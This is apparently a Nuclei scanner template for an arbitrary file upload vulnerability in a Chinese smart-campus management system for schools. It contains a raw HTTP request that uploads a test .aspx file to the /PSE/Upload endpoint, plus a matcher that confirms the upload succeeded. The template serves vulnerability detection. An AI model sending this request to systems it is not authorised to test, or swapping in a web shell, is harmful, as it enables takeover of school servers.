id: xzxx-Upload-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 新中新中小学智慧校园信息管理系统PSE存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%96%B0%E4%B8%AD%E6%96%B0%E4%B8%AD%E5%B0%8F%E5%AD%A6%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FUpload%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        POST /PSE/Upload HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
        Content-Type: multipart/form-data; boundary=00content0boundary00
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Content-Length: 147
        Connection: close

        --00content0boundary00
        Content-Disposition: form-data; name="file"; filename="test.aspx"
        Content-Type: image/jpg

        123
        --00content0boundary00--
    matchers:
      - type: word
        part: body
        words:
          - '.aspx'
